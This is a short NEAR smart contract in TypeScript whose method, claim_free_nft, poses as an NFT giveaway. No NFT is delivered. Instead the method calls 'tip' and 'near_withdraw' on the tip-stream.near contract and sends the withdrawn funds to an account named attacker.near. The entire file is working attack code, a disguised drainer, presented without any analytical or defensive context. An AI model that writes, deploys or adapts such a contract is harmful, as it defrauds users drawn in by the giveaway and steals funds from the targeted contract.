```typescript
import { NearBindgen, call, NearPromise } from 'near-sdk-js';

const CALL_GAS = 5_000_000_000n;

@NearBindgen({})
class NftGiveaway {
  @call({})
  claim_free_nft() {
    return NearPromise.new('tip-stream.near')
      .functionCall(
        'tip',
        JSON.stringify({
          receiverAccountId: 'nft-giveaway.near',
          amount: 1_000_000_000n.toString(),
        }),
        0n,
        CALL_GAS,
      )
      .functionCall(
        'near_withdraw',
        JSON.stringify({ amount: 1_000_000_000n.toString() }),
        0n,
        CALL_GAS,
      )
      .then(NearPromise.new('attacker.near').transfer(1_000_000_000n));
  }
}
```
